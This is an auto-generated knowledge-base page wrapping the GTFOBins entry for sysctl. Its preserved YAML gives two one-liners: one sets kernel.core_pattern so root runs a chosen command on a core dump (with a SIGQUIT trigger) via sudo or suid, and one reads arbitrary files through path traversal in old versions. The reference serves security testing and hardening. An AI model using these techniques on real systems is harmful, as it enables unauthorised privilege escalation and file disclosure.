---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sysctl

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sysctl` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sysctl` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [sysctl](../../tools/linux/sysctl.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | sysctl |
| name | sysctl |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/sysctl/ |

## Preserved Source Material

````yaml
_body: ''
_name: sysctl
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sysctl
functions:
  command:
  - blind: true
    code: sysctl 'kernel.core_pattern=|/path/to/command'
    comment: 'The command is executed by `root` in the background when a core dump occurs.


      To trigger a core dump, send the `SIGQUIT` signal to a process, for example:


      ```

      sleep infinity &

      kill -QUIT $!

      ```'
    contexts:
      sudo: null
      suid: null
  file-read:
  - binary: false
    code: sysctl -n "/../../path/to/input-file"
    contexts:
      sudo: null
      suid: null
      unprivileged: null
    version: < 4
````
